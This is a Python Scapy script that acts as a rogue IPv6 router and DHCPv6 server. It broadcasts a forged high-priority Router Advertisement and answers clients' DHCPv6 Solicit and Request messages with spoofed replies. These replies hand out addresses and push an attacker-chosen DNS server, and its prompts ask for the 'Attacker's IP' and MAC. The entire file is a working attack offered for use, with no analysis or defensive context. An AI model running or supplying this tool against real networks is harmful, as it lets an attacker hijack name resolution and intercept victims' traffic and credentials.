#!/usr/bin/python
import random
import sys
from scapy.layers.dhcp6 import DHCP6_Solicit, DHCP6_Advertise, DHCP6OptClientId, DUID_LLT, DHCP6OptServerId, \
    DHCP6OptDNSServers, DHCP6OptIA_NA, DHCP6OptIAAddress, DHCP6_Request, DHCP6_Reply
from scapy.layers.inet import UDP
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptMTU, \
    ICMPv6NDOptRDNSS
from scapy.sendrecv import send, sniff

# Ask user to insert value
if len(sys.argv) == 6:
    attack_ip = sys.argv[1]
    attack_mac = sys.argv[2]
    network_address = sys.argv[3]
    prefix_length = int(sys.argv[4])
    dns_server = sys.argv[5]
else:
    print("Please insert:\n 1. Attacker's IP address\n "
          "2. Attacker's MAC\n 3. Network address\n 4. Prefix length\n "
          "5. DNS server")
    sys.exit(1)

# Generate Router Advertisement message
layer3_RA = IPv6(src=attack_ip, dst="ff02::1")
address = network_address + "::"
packet_RA = layer3_RA / ICMPv6ND_RA(prf="High", M=1, O=1, routerlifetime=350) / \
            ICMPv6NDOptMTU(mtu=1500) / \
            ICMPv6NDOptSrcLLAddr(lladdr=attack_mac) / \
            ICMPv6NDOptPrefixInfo(prefixlen=prefix_length, A=0,
                                  validlifetime=0x12c,
                                  preferredlifetime=0x96,
                                  prefix=address) / \
            ICMPv6NDOptRDNSS(dns=[dns_server])
send(packet_RA, verbose=False)


def change_send(pkt):
    if DHCP6_Solicit in pkt:
        server_duid = DUID_LLT(type=1, hwtype=1, timeval=pkt[DHCP6OptClientId].duid.timeval + 9050,
                               lladdr=attack_mac)
        M = 16 ** 4
        addr_server = network_address + ":" + "".join(("%x" % random.randint(0, M)
                                                       for j in range(1))) + "::"
        layer3 = IPv6(src=attack_ip, dst=pkt[IPv6].src)
        layer4 = UDP(sport=547, dport=546)
        advertise = DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid)
        clientID = DHCP6OptClientId(duid=pkt[DHCP6OptClientId][1])
        serverID = DHCP6OptServerId(duid=server_duid)
        dnsServer = DHCP6OptDNSServers(dnsservers=[dns_server])
        ia_na = DHCP6OptIA_NA(iaid=369101865, T1=32512, T2=65024,
                              ianaopts=DHCP6OptIAAddress(optcode=5, optlen=24,
                                                         addr=addr_server,
                                                         preflft=131072,
                                                         validlft=131072))
        send(layer3 / layer4 / advertise / clientID / serverID / dnsServer / ia_na, verbose=False)
        print("Send Advertisement to client with link-local IPv6 address:", pkt[IPv6].src)
    if DHCP6_Request in pkt:
        layer3 = IPv6(src=attack_ip, dst=pkt[IPv6].src)
        layer4 = UDP(sport=547, dport=546)
        reply = DHCP6_Reply(trid=pkt[DHCP6_Request].trid)
        clientID = DHCP6OptClientId(duid=pkt[DHCP6OptClientId][1])
        serverID = DHCP6OptServerId(duid=pkt[DHCP6OptServerId][1])
        ia_na = DHCP6OptIA_NA(iaid=369101865, T1=32512, T2=65024,
                              ianaopts=pkt[DHCP6OptIA_NA].ianaopts)
        dnsServer = DHCP6OptDNSServers(dnsservers=[dns_server])
        send(layer3 / layer4 / reply / clientID / serverID / ia_na / dnsServer, verbose=False)
        print("Send Reply to client with link-local IPv6 address:", pkt[IPv6].src)


while True:
    sniff(iface='eth0', prn=change_send)
